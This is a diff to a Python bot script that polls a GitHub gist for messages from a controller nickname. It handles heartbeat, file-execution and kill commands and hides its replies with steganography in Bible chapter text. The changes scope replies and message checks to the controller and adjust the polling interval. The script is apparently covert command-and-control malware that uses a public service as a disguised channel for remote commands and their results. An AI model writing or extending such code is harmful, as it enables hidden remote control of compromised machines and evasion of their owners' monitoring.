@@ -12,7 +12,8 @@ from common.gist import pull_gist, init_gist
 from common.chapters import get_command_for_chapter, read_chapter
 from common.steganography import encode_to_text, decode_from_text
 
-SLEEP_TIME = 10
+
+BOT_SLEEP_TIME = 5
 BOT_NICK_NAME = sys.argv[1] if len(sys.argv) > 1 else 'BIBLE'
 
 
@@ -53,7 +54,7 @@ def process_exec(file_path):
     return 'File does not exist'
 
 
-def send_reply(cmd, chapter_n, result, reply_to, reply_text):
+def send_reply(cmd, chapter_n, result, question_msg_id, reply_text):
     print(f'>>> {cmd} reply:\n{result}', flush=True)
 
     chapter = read_chapter(chapter_n)
@@ -61,6 +62,10 @@ def send_reply(cmd, chapter_n, result, reply_to, reply_text):
     attachment = {
         'name': str(uuid.uuid4()) + '.txt',
         'content': encoded[0:int(encoded_len*1.2)],
+    }
+    reply_to = {
+        'msg_id': question_msg_id,
+        'user': CONTROLLER_NICK_NAME,
     }
     add_message(reply_text, BOT_NICK_NAME, reply_to=reply_to, attachment=attachment)
 
@@ -71,7 +76,11 @@ def process_msg(sender, msg_id, msg, attachment):
         return
 
     if msg == 'Tell me latest Bible news...':
-        add_message('Bible is old, there are no news', BOT_NICK_NAME, reply_to=msg_id)
+        reply_to = {
+            'msg_id': msg_id,
+            'user': CONTROLLER_NICK_NAME,
+        }
+        add_message('Bible is old, there are no news', BOT_NICK_NAME, reply_to=reply_to)
         print('>>> Heartbeat, bot is running', flush=True)
 
     elif msg.startswith('Send me text of chapter '):
@@ -121,15 +130,15 @@ def process_msg(sender, msg_id, msg, attachment):
 def run():
     print('>>> Bot is starting...', flush=True)
     init_gist()
-    max_msg_id = check_chat_file()
+    max_msg_id = check_chat_file(CONTROLLER_NICK_NAME)
     print(f'>>> Bot is running as {BOT_NICK_NAME}...', flush=True)
 
     is_killed = False
 
     while not is_killed:
-        sleep(SLEEP_TIME)
+        sleep(BOT_SLEEP_TIME)
         pull_gist()
-        new_max_msg_id = check_chat_file()
+        new_max_msg_id = check_chat_file(CONTROLLER_NICK_NAME)
 
         if new_max_msg_id < max_msg_id:
             print(f'>>> Gist was reset...', flush=True)
@@ -139,7 +148,7 @@ def run():
             count = new_max_msg_id - max_msg_id
             print(f'>>> Processing {count} new messages...', flush=True)
 
-            messages = get_last_messages(count)
+            messages = get_last_messages(CONTROLLER_NICK_NAME, count)
             for (sender, msg_id, reply_id, attachment, msg) in messages:
                 result = process_msg(sender, msg_id, msg, attachment)
                 if result == 'kill':
